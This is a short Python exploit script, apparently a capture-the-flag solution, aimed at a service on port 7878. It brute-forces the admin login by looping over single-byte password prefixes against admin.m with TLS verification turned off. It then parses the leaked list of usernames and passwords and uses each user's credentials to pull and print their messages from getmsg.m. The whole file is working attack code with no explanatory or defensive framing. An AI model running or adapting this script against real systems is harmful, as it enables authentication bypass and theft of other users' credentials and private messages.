#!/usr/bin/env python3

import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

host = sys.argv[1]
username = "admin"


for i in range(1,256):
	password = chr(i)+"."*10
	dt = username+"\x00"+password+"\x00"

	r = requests.post(f"https://{host}:7878/admin.m", data=dt, verify=False)
	if not "BAD CRED" in r.text.strip():
		users, passws = [i.split('\n') for i in r.text.strip().split('\n\n')]

		i = 0
		for user in users:
			if user != 'admin':
				dt = user+"\x00"+passws[i]+"\x00admin\x00"

				r = requests.post(f"https://{host}:7878/getmsg.m", data=dt, verify=False)
				print(r.text, flush=True)
				i += 1
		break
